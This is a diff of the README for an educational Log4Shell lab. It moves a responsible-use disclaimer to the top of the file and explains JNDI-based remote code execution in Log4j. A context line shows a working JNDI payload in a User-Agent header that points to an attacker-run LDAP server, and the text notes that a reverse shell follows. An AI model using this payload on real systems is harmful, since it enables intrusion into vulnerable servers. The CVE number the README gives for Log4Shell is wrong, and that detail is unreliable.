@@ -1,6 +1,8 @@
 
 # Log4Shell lab
 
+> This tutorial, including all code and documentation, is provided for educational and research purposes only. It aims to enhance understanding of cybersecurity vulnerabilities, defensive strategies, and the importance of maintaining secure systems. The demonstration of the Log4Shell vulnerability is intended to inform developers, security professionals, and educational institutions about the risks and mitigation techniques related to this and similar vulnerabilities.
+
 The _Log4Shell exploit_ (CVE-2021-44832) targets a vulnerability in the Apache Log4j logging library, allowing remote code execution by manipulating log messages. Specifically, the exploit involves the use of a malicious LDAP server to inject arbitrary code into a vulnerable Java application via JNDI lookups.
 
 Log4j uses Java Naming and Directory Interface (JNDI) to enable dynamic logging configuration based on resources located through naming and directory services. It allows log messages to include lookup patterns that can retrieve data from various sources, such as LDAP or DNS.
@@ -140,10 +142,6 @@ User-Agent: ${jndi:ldap://192.168.5.2:1389/o=tomcat}
 We get a shell connection into the Docker container.
 
 ![](img/revshell.png)
-
-## Ethical consideration and responsible use
-
-This tutorial, including all code and documentation, is provided for educational and research purposes only. It aims to enhance understanding of cybersecurity vulnerabilities, defensive strategies, and the importance of maintaining secure systems. The demonstration of the Log4Shell vulnerability is intended to inform developers, security professionals, and educational institutions about the risks and mitigation techniques related to this and similar vulnerabilities.
 
 ## Resources
 
